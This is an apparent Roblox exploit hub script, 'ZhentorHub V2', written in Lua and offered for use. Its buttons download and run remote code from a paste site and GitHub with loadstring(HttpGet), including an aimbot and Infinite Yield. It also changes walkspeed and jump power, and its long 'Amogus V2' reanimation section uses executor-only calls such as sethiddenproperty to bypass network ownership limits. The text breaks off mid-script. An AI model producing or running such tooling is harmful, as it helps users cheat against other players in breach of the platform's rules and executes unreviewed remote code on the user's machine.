--Library

local UILibrary = loadstring(game:HttpGet("https://pastebinp.com/raw/V1ca2q9s"))()

--Tabs

local MainUI = UILibrary.Load("ZhentorHub V2")
local HomeTab = MainUI.AddPage("Home")
local UniversalTab = MainUI.AddPage("Universal")
local ScriptsTab = MainUI.AddPage("Scripts")
local CreditsTab = MainUI.AddPage("Credits")

--Home Tab

local Welcome = HomeTab.AddLabel("Welcome To Hub, "..game.Players.LocalPlayer.Name)

local Instructions = HomeTab.AddLabel("You can find all scripts in the scripts tab")
local Instructions2 = HomeTab.AddLabel("Also dont forget to check the universal tab for more")
local Instructions3 = HomeTab.AddLabel("And i will put IY here but you can find it in universal")
local Instructions4 = HomeTab.AddLabel("You can find it on scripts tab too")
local Instructions5 = HomeTab.AddLabel("Have fun using it :)")
local InfiniteYield = HomeTab.AddButton("Infinite Yield", function()
loadstring(game:HttpGet('https://raw.githubusercontent.com/EdgeIY/infiniteyield/master/source'))()
end)

--Universal Tab

local Instructions = UniversalTab.AddLabel("Universal Scripts")

local WalkspeedSlider = UniversalTab.AddSlider("Walkspeed", {Min = 0, Max = 500, Def = 16}, function(Value)
game.Players.LocalPlayer.Character.Humanoid.WalkSpeed = (Value)
end)

local JumppowerSlider = UniversalTab.AddSlider("Jumppower", {Min = 0, Max = 500, Def = 50}, function(Value)
game.Players.LocalPlayer.Character.Humanoid.JumpPower = (Value)
end)

local InvisToggle = UniversalTab.AddToggle("Invisible", false, function(Value)
print(Value)
end)

local Aimbot = UniversalTab.AddButton("Universal Aimbot", function()
loadstring(game:HttpGet("https://pastebinp.com/raw/T42dfDRT"))()
end)

--Scripts Tab

local AmogusV2 = ScriptsTab.AddButton("Amogus V2", function()

local netboost = 1000 --velocity 
--netboost usage: 
--set to false to disable
--set to a vector3 value if you dont want the velocity to change
--set to a number to change the velocity in real time with magnitude equal to the number
local idleMag = 0.005 --used only in case netboost is set to a number value
--if magnitude of the real velocity of a part is lower than this
--then the fake velocity is being set to Vector3.new(0, netboost, 0)
--the lower value the less you jitter but you might loose network ownership
local simradius = "shp" --simulation radius (net bypass) method
--"shp" - sethiddenproperty
--"ssr" - setsimulationradius
--false - disable
local antiragdoll = true --removes hingeConstraints and ballSocketConstraints from your character
local newanimate = false --disables the animate script and enables after reanimation
local discharscripts = true --disables all localScripts parented to your character before reanimation
local R15toR6 = true --tries to convert your character to r6 if its r15
local addtools = false --puts all tools from backpack to character and lets you hold them after reanimation
local loadtime = game:GetService("Players").RespawnTime + 0.5 --anti respawn delay
local method = 3 --reanimation method
--methods:
--0 - breakJoints (takes [loadtime] seconds to laod)
--1 - limbs
--2 - limbs + anti respawn
--3 - limbs + breakJoints after [loadtime] seconds
--4 - remove humanoid + breakJoints
--5 - remove humanoid + limbs
local alignmode = 2 --AlignPosition mode
--modes:
--1 - AlignPosition rigidity enabled true
--2 - 2 AlignPositions rigidity enabled both true and false
--3 - AlignPosition rigidity enabled false
local hedafterneck = true --disable aligns for head and enable after neck is removed

local lp = game:GetService("Players").LocalPlayer
local rs = game:GetService("RunService")
local stepped = rs.Stepped
local heartbeat = rs.Heartbeat
local renderstepped = rs.RenderStepped
local sg = game:GetService("StarterGui")
local ws = game:GetService("Workspace")
local cf = CFrame.new
local v3 = Vector3.new
local v3_0 = v3(0, 0, 0)
local inf = math.huge

local c = lp.Character

if not (c and c.Parent) then
    return
end

for i, v in pairs(c:GetDescendants()) do
    if v:IsA("CharacterMesh") or v:IsA("SpecialMesh") then
        v:Destroy()
    end
end

c:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (c and c.Parent) then
        c = nil
    end
end)

local function gp(parent, name, className)
	local ret = nil
	pcall(function()
		for i, v in pairs(parent:GetChildren()) do
			if (v.Name == name) and v:IsA(className) then
				ret = v
				break
			end
		end
	end)
	return ret
end

local function align(Part0, Part1)
	Part0.CustomPhysicalProperties = PhysicalProperties.new(0.0001, 0.0001, 0.0001, 0.0001, 0.0001)

	local att0 = Instance.new("Attachment", Part0)
	att0.Orientation = v3_0
	att0.Position = v3_0
	att0.Name = "att0_" .. Part0.Name
	local att1 = Instance.new("Attachment", Part1)
	att1.Orientation = v3_0
	att1.Position = v3_0
	att1.Name = "att1_" .. Part1.Name

	if (alignmode == 1) or (alignmode == 2) then
    	local ape = Instance.new("AlignPosition", att0)
    	ape.ApplyAtCenterOfMass = false
    	ape.MaxForce = inf
    	ape.MaxVelocity = inf
    	ape.ReactionForceEnabled = false
    	ape.Responsiveness = 200
    	ape.Attachment1 = att1
    	ape.Attachment0 = att0
    	ape.Name = "AlignPositionRtrue"
    	ape.RigidityEnabled = true
	end

	if (alignmode == 2) or (alignmode == 3) then
    	local apd = Instance.new("AlignPosition", att0)
    	apd.ApplyAtCenterOfMass = false
    	apd.MaxForce = inf
    	apd.MaxVelocity = inf
    	apd.ReactionForceEnabled = false
    	apd.Responsiveness = 200
    	apd.Attachment1 = att1
    	apd.Attachment0 = att0
    	apd.Name = "AlignPositionRfalse"
    	apd.RigidityEnabled = false
    end

	local ao = Instance.new("AlignOrientation", att0)
	ao.MaxAngularVelocity = inf
	ao.MaxTorque = inf
	ao.PrimaryAxisOnly = false
	ao.ReactionTorqueEnabled = false
	ao.Responsiveness = 200
	ao.Attachment1 = att1
	ao.Attachment0 = att0
	ao.RigidityEnabled = false

    if netboost then
        Part0:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (Part0 and Part0.Parent) then
                Part0 = nil
            end
        end)
        spawn(function()
            if typeof(netboost) == "Vector3" then
    	        local vel = v3_0
    	        local rotvel = v3_0
            	while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        vel = Part0.Velocity
                        Part0.Velocity = netboost
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
        	elseif typeof(netboost) == "number" then
    	        local vel = v3_0
    	        local rotvel = v3_0
            	while Part0 do
                    Part0.Velocity = vel
                    Part0.RotVelocity = rotvel
                    heartbeat:Wait()
                    if Part0 then
                        local newvel = vel
                        local mag = newvel.Magnitude
                        if mag < idleMag then
                            newvel = v3(0, netboost, 0)
                        else
                            local multiplier = netboost / mag
                            newvel *= v3(multiplier,  multiplier, multiplier)
                        end
                        vel = Part0.Velocity
                        rotvel = Part0.RotVelocity
                        Part0.Velocity = newvel
                        Part0.RotVelocity = v3_0
                        stepped:Wait()
                    end
                end
        	end
        end)
    end
end

local function respawnrequest()
    local c = lp.Character
    local ccfr = ws.CurrentCamera.CFrame
	local fc = Instance.new("Model")
	local nh = Instance.new("Humanoid", fc)
	lp.Character = fc
	nh.Health = 0
	lp.Character = c
	fc:Destroy()
    local con = nil
    local function confunc()
        con:Disconnect()
        ws.CurrentCamera.CFrame = ccfr
    end
    con = renderstepped:Connect(confunc)
end

local destroyhum = (method == 4) or (method == 5)
local breakjoints = (method == 0) or (method == 4)
local antirespawn = (method == 0) or (method == 2) or (method == 3)

addtools = addtools and gp(lp, "Backpack", "Backpack")

if simradius == "shp" then
    local shp = sethiddenproperty or set_hidden_property or set_hidden_prop or sethiddenprop
    if shp then
        spawn(function()
            while c and heartbeat:Wait() do
                shp(lp, "SimulationRadius", inf)
            end
        end)
    end
elseif simradius == "ssr" then
    local ssr = setsimulationradius or set_simulation_radius or set_sim_radius or setsimradius or set_simulation_rad or setsimulationrad
    if ssr then
        spawn(function()
            while c and heartbeat:Wait() do
                ssr(inf)
            end
        end)
    end
end

antiragdoll = antiragdoll and function(v)
    if v:IsA("HingeConstraint") or v:IsA("BallSocketConstraint") then
        v.Parent = nil
    end
end

if antiragdoll then
    for i, v in pairs(c:GetDescendants()) do
        antiragdoll(v)
    end
    c.DescendantAdded:Connect(antiragdoll)
end

if antirespawn then
    respawnrequest()
end

if method == 0 then
	wait(loadtime)
	if not c then
	    return
	end
end

if discharscripts then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("LocalScript") then
            v.Disabled = true
        end
    end
elseif newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate and (not animate.Disabled) then
        animate.Disabled = true
    else
        newanimate = false
    end
end

local hum = c:FindFirstChildOfClass("Humanoid")
if hum then
    for i, v in pairs(hum:GetPlayingAnimationTracks()) do
	    v:Stop()
    end
end

if addtools then
    for i, v in pairs(addtools:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = c
        end
    end
end

pcall(function()
    settings().Physics.AllowSleep = false
    settings().Physics.PhysicsEnvironmentalThrottle = Enum.EnviromentalPhysicsThrottle.Disabled
end)

local OLDscripts = {}

for i, v in pairs(c:GetDescendants()) do
	if v.ClassName == "Script" then
		table.insert(OLDscripts, v)
	end
end

local scriptNames = {}

for i, v in pairs(c:GetDescendants()) do
	if v:IsA("BasePart") then
	    local newName = tostring(i)
	    local exists = true
	    while exists do
		    exists = false
		    for i, v in pairs(OLDscripts) do
		        if v.Name == newName then
		            exists = true
		        end
		    end
		    if exists then
		        newName = newName .. "_"    
		    end
	    end
        table.insert(scriptNames, newName)
		Instance.new("Script", v).Name = newName
	end
end

c.Archivable = true
local cl = c:Clone()
for i, v in pairs(cl:GetDescendants()) do
    pcall(function()
        v.Transparency = 1
        v.Anchored = false
    end)
end

local model = Instance.new("Model", c)
model.Name = model.ClassName

model:GetPropertyChangedSignal("Parent"):Connect(function()
    if not (model and model.Parent) then
        model = nil
    end
end)

for i, v in pairs(c:GetChildren()) do
	if v ~= model then
	    if destroyhum and v:IsA("Humanoid") then
	        v:Destroy()
	    else
	        if addtools and v:IsA("Tool") then
	            for i1, v1 in pairs(v:GetDescendants()) do
	                if v1 and v1.Parent and v1:IsA("BasePart") then
	                    local bv = Instance.new("BodyVelocity", v1)
	                    bv.Velocity = v3_0
	                    bv.MaxForce = v3(1000, 1000, 1000)
	                    bv.P = 1250
	                    bv.Name = "bv_" .. v.Name
	                end
	            end
	        end
		    v.Parent = model
	    end
	end
end
local head = gp(model, "Head", "BasePart")
local torso = gp(model, "Torso", "BasePart") or gp(model, "UpperTorso", "BasePart")
if breakjoints then
    model:BreakJoints()
else
    if head and torso then
        for i, v in pairs(model:GetDescendants()) do
            if v:IsA("Weld") or v:IsA("Snap") or v:IsA("Glue") or v:IsA("Motor") or v:IsA("Motor6D") then
                local save = false
                if (v.Part0 == torso) and (v.Part1 == head) then
                    save = true
                end
                if (v.Part0 == head) and (v.Part1 == torso) then
                    save = true
                end
                if save then
                    if hedafterneck then
                        hedafterneck = v
                    end
                else
                    v:Destroy()
                end
            end
        end
    end
    if method == 3 then
        spawn(function()
            wait(loadtime)
            if model then
                model:BreakJoints()
            end
        end)
    end
end

cl.Parent = c
for i, v in pairs(cl:GetChildren()) do
	v.Parent = c
end
cl:Destroy()

local modelDes = {}
for i, v in pairs(model:GetDescendants()) do
    if v:IsA("BasePart") then
        i = tostring(i)
        local con = nil
        con = v:GetPropertyChangedSignal("Parent"):Connect(function()
            if not (v and v.Parent) then
                con:Disconnect()
                modelDes[i] = nil
            end
        end)
        modelDes[i] = v
    end
end
local modelcolcon = nil
local function modelcolf()
    if model then
        for i, v in pairs(modelDes) do
			v.CanCollide = false
		end
    else
        modelcolcon:Disconnect()
    end
end
modelcolcon = stepped:Connect(modelcolf)
modelcolf()

for i, scr in pairs(model:GetDescendants()) do
	if (scr.ClassName == "Script") and table.find(scriptNames, scr.Name) then
		local Part0 = scr.Parent
		if Part0:IsA("BasePart") then
			for i1, scr1 in pairs(c:GetDescendants()) do
				if (scr1.ClassName == "Script") and (scr1.Name == scr.Name) and (not scr1:IsDescendantOf(model)) then
					local Part1 = scr1.Parent
					if (Part1.ClassName == Part0.ClassName) and (Part1.Name == Part0.Name) then
						align(Part0, Part1)
						break
					end
				end
			end
		end
	end
end

if (typeof(hedafterneck) == "Instance") and head and head.Parent then
    local aligns = {}
    for i, v in pairs(head:GetDescendants()) do
        if v:IsA("AlignPosition") or v:IsA("AlignOrientation") then
            table.insert(aligns, v)
            v.Enabled = false
        end
    end
    spawn(function()
        while c and hedafterneck and hedafterneck.Parent do
            stepped:Wait()
        end
        if not (c and head and head.Parent) then
            return
        end
        for i, v in pairs(aligns) do
            pcall(function()
                v.Enabled = true
            end)
        end
    end)
end

for i, v in pairs(c:GetDescendants()) do
	if v and v.Parent then
		if v.ClassName == "Script" then
			if table.find(scriptNames, v.Name) then
				v:Destroy()
			end
		elseif not v:IsDescendantOf(model) then
			if v:IsA("Decal") then
			    v.Transparency = 1
			elseif v:IsA("ForceField") then
			    v.Visible = false
			elseif v:IsA("Sound") then
			    v.Playing = false
			elseif v:IsA("BillboardGui") or v:IsA("SurfaceGui") or v:IsA("ParticleEmitter") or v:IsA("Fire") or v:IsA("Smoke") or v:IsA("Sparkles") then
				v.Enabled = false
			end
		end
	end
end

if newanimate then
    local animate = gp(c, "Animate", "LocalScript")
    if animate then
        animate.Disabled = false
    end
end

if addtools then
    for i, v in pairs(c:GetChildren()) do
        if v:IsA("Tool") then
            v.Parent = addtools
        end
    end
end

local hum0 = model:FindFirstChildOfClass("Humanoid")
local hum1 = c:FindFirstChildOfClass("Humanoid")
if hum1 then
    ws.CurrentCamera.CameraSubject = hum1
    local camSubCon = nil
    local function camSubFunc()
        camSubCon:Disconnect()
        if c and hum1 and (hum1.Parent == c) then
            ws.CurrentCamera.CameraSubject = hum1
        end
    end
    camSubCon = renderstepped:Connect(camSubFunc)
	if hum0 then
		hum0.Changed:Connect(function(prop)
			if (prop == "Jump") and hum1 and hum1.Parent then
				hum1.Jump = hum0.Jump
			end
		end)
	else
	    lp.Character = nil
	    lp.Character = c
	end
end

local rb = Instance.new("BindableEvent", c)
rb.Event:Connect(function()
	rb:Destroy()
	sg:SetCore("ResetButtonCallback", true)
	if destroyhum then
	    c:BreakJoints()
	    return
	end
	if antirespawn then
	    if hum0 and hum0.Parent and (hum0.Health > 0) then
	        model:BreakJoints()
	        hum0.Health = 0
	    end
		respawnrequest()
	else
	    if hum0 and hum0.Parent and (hum0.Health > 0) then
	        model:BreakJoints()
	        hum0.Health = 0
	    end
	end
end)
sg:SetCore("ResetButtonCallback", rb)

spawn(function()
	while c do
		if hum0 and hum0.Parent and hum1 and hum1.Parent then
            hum1.Jump = hum0.Jump
        end
		wait()
	end
	sg:SetCore("ResetButtonCallback", true)
end)

R15toR6 = R15toR6 and hum1 and (hum1.RigType == Enum.HumanoidRigType.R15)
if R15toR6 then
	local cfr = nil
	pcall(function()
		cfr = gp(c, "HumanoidRootPart", "BasePart").CFrame
	end)
	if cfr then
		local R6parts = { 
			head = {
				Name = "Head",
				Size = v3(2, 1, 1),
				R15 = {
					Head = 0
				}
			},
			torso = {
				Name = "Torso",
				Size = v3(2, 2, 1),
				R15 = {
					UpperTorso = 0.2,
					LowerTorso = -0.8
				}
			},
			root = {
				Name = "HumanoidRootPart",
				Size = v3(2, 2, 1),
				R15 = {
					HumanoidRootPart = 0
				}
			},
			leftArm = {
				Name = "Left Arm",
				Size = v3(1, 2, 1),
				R15 = {
					LeftHand = -0.85,
					LeftLowerArm = -0.2,
					LeftUpperArm = 0.4
				}
			},
			rightArm = {
				Name = "Right Arm",
				Size = v3(1, 2, 1),
				R15 = {
					RightHand = -0.85,
					RightLowerArm = -0.2,
					RightUpperArm = 0.4
				}
			},
			leftLeg = {
				Name = "Left Leg",
				Size = v3(1, 2, 1),
				R15 = {
					LeftFoot = -0.85,
					LeftLowerLeg = -0.15,
					LeftUpperLeg = 0.6
				}
			},
			rightLeg = {
				Name = "Right Leg",
				Size = v3(1, 2, 1),
				R15 = {
					RightFoot = -0.85,
					RightLowerLeg = -0.15,
					RightUpperLeg = 0.6
				}
			}
		}
		for i, v in pairs(c:GetChildren()) do
			if v:IsA("BasePart") then
				for i1, v1 in pairs(v:GetChildren()) do
					if v1:IsA("Motor6D") then
						v1.Part0 = nil
					end
				end
			end
		end
		for i, v in pairs(R6parts) do
			local part = Instance.new("Part")
			part.Name = v.Name
			part.Size = v.Size
			part.CFrame = cfr
			part.Anchored = false
			part.Transparency = 1
			part.CanCollide = false
			for i1, v1 in pairs(v.R15) do
				local R15part = gp(c, i1, "BasePart")
				local att = gp(R15part, "att1_" .. i1, "Attachment")
				if R15part then
					local weld = Instance.new("Weld", R15part)
					weld.Name = "Weld_" .. i1
					weld.Part0 = part
					weld.Part1 = R15part
					weld.C0 = cf(0, v1, 0)
					weld.C1 = cf(0, 0, 0)
					R15part.Massless = true
					R15part.Name = "R15_" .. i1
					R15part.Parent = part
				    if att then
				        att.Parent = part
				        att.Position = v3(0, v1, 0)
				    end
				end
			end
			part.Parent = c
			R6parts[i] = part
		end
		local R6joints = {
			neck = {
				Parent = R6parts.torso,
				Name = "Neck",
				Part0 = R6parts.torso,
				Part1 = R6parts.head,
				C0 = cf(0, 1, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, -0.5, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rootJoint = {
				Parent = R6parts.root,
				Name = "RootJoint" ,
				Part0 = R6parts.root,
				Part1 = R6parts.torso,
				C0 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0),
				C1 = cf(0, 0, 0, -1, 0, 0, 0, 0, 1, 0, 1, -0)
			},
			rightShoulder = {
				Parent = R6parts.torso,
				Name = "Right Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightArm,
				C0 = cf(1, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(-0.5, 0.5, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftShoulder = {
				Parent = R6parts.torso,
				Name = "Left Shoulder",
				Part0 = R6parts.torso,
				Part1 = R6parts.leftArm,
				C0 = cf(-1, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(0.5, 0.5, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			},
			rightHip = {
				Parent = R6parts.torso,
				Name = "Right Hip",
				Part0 = R6parts.torso,
				Part1 = R6parts.rightLeg,
				C0 = cf(1, -1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0),
				C1 = cf(0.5, 1, 0, 0, 0, 1, 0, 1, -0, -1, 0, 0)
			},
			leftHip = {
				Parent = R6parts.torso,
				Name = "Left Hip" ,
				Part0 = R6parts.torso,
				Part1 = R6parts.leftLeg,
				C0 = cf(-1, -1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0),
				C1 = cf(-0.5, 1, 0, 0, 0, -1, 0, 1, 0, 1, 0, 0)
			}
		}
		for i, v in pairs(R6joints) do
			local joint = Instance.new("Motor6D")
			for prop, val in pairs(v) do
				joint[prop] = val
			end
			R6joints[i] = joint
		end
		hum1.RigType = Enum.HumanoidRigType.R6
		hum1.HipHeight = 0
	end
end

wait()
if not c then
    return
end

local venttoggle = false
local vented = false
local mode2 = false
local attack = false
local modetoggle = false
local dead = false
local dtoggle = false
local sittoggle = false
local sit = false
local sine = 0
local mouse = lp:GetMouse()

local joints = {
    ["RootJoint"] = "",
    ["Neck"] = "",
    ["Right Hip"] = "",
    ["Left Hip"] = "",
    ["Left Shoulder"] = "",
    ["Right Shoulder"] = ""
}

for i, v in pairs(c:GetDescendants()) do
    if v:IsA("Motor6D") and (joints[v.Name] == "") and (not v:IsDescendantOf(model)) then
        joints[v.Name] = v
    end
end

for i, v in pairs(joints) do
    if v and (v ~= "") then
        v.C0 = cf(0, 0, 0)
        v.C1 = cf(0, 0, 0)
    else
        return
    end
end

local Root = gp(c, "HumanoidRootPart", "BasePart")
if not Root then
    return
end

local function replace(a)
    local b, c = a.Part0, a.Part1
    a.Part1, a.Part0 = b, c
end

replace(joints["Left Shoulder"])
replace(joints["Right Shoulder"])
replace(joints["Left Hip"])
replace(joints["Right Hip"])

for i, v in pairs(c:GetChildren()) do
    if v:IsA("Accessory") then
        v:Destroy()
    end
end

joints.Neck.C0 = cf(0, 0.3, -0.5)

mouse.Button1Down:Connect(function()
    if not (kill or mode2 or dead) then
        attack = true
        vented = false
        hum1.WalkSpeed = 0
        wait(0.5)
        hum1.WalkSpeed = 16
        attack = false
    end
end)

mouse.KeyDown:Connect(function(key)
    if not c then 
        return 
    end
    key = key:lower()
    if k == "e" then
        if not venttoggle then
            modetoggle = false
            mode2 = false
            venttoggle = true
            vented = true
            hum1.WalkSpeed = 100
            position = "ventidle"
        elseif venttoggle then
            venttoggle = false
            vented = false
            hum1.WalkSpeed = 16
        end
    elseif key == "f" then
        if not modetoggle then
            venttoggle = false
            vented = false
            modetoggle = true
            mode2 = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 60
        elseif modetoggle then
            modetoggle = false
            mode2 = false
            hum1.WalkSpeed = 16
        end
    elseif key == "q" then
        if dtoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = true
            dead = true
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 0
        elseif dtoggle == true then
            dtoggle = false
            dead = false
            hum1.WalkSpeed = 16
        end
    elseif key == "c" then
        if sittoggle == false then
            venttoggle = false
            vented = false
            modetoggle = false
            mode2 = false
            dtoggle = false
            dead = false
            sittoggle = true
            sit = true
            hum1.WalkSpeed = 0
        elseif sittoggle == true then
            sittoggle = false
            sit = false
            hum1.WalkSpeed = 16
        end
    end
end)

local pose = "idle"
while stepped:Wait() and c do
    if attack then
        pose = "attack"
    elseif dead then
        pose = "dead"
    elseif sit then
        pose = "sit"
    elseif mode2 then
        if Root.Velocity.Magnitude < 2 then
            pose = "idle2"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "walk2"
        end
    else
        if Root.Velocity.y > 1 then
            pose = "jump"
        elseif Root.Velocity.y < -1 then
            pose = "fall"
        elseif Root.Velocity.Magnitude < 2 then
            pose = "idle"
        elseif Root.Velocity.Magnitude < 20 then
            pose = "walk"
        elseif Root.Velocity.Magnitude > 20 then
            pose = "run"
        end 
    end
    sine += 1
    if pose == "idle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(20 + 0 * math.sin(sine/12)), math.rad(-3 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 10 * math.sin(sine/12)), math.rad(-20 + 0 * math.sin(sine/12)), math.rad(3 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "walk" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0.3 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(-10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + 0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0.3 * math.sin(sine/12), 0.3 + -0.3 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + -30 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "jump" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "fall" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(15 + 10 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(-10 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12), 0.5 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(10 + 5 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(10 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "vent" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), 0 + -8 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "ventidle" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/12), -20 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/12), 1.5 + 0 * math.sin(sine/12), 1 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(26.02 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/12), 2 + 0 * math.sin(sine/12), 0 + 0 * math.sin(sine/12)) * CFrame.Angles(math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12)), math.rad(0 + 0 * math.sin(sine/12))),0.1)
    elseif pose == "idle2" then
        joints["RootJoint"].C0 = joints["RootJoint"].C0:lerp(CFrame.new(0 + 0 * math.sin(sine/20), 3 + 0.3 * math.sin(sine/20), 0 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(0 + 20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Right Hip"].C0 = joints["Right Hip"].C0:lerp(CFrame.new(-0.5 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20), 1 + 0 * math.sin(sine/20)) * CFrame.Angles(math.rad(20 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
        joints["Left Hip"].C0 = joints["Left Hip"].C0:lerp(CFrame.new(0.5 + 0 * math.sin(sine/20), 2 + 0 * math.sin(sine/20), 0.5 + -0.5 * math.sin(sine/20)) * CFrame.Angles(math.rad(10 + -20 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20)), math.rad(0 + 0 * math.sin(sine/20))),0.1)
    elseif pose == "walk2" then
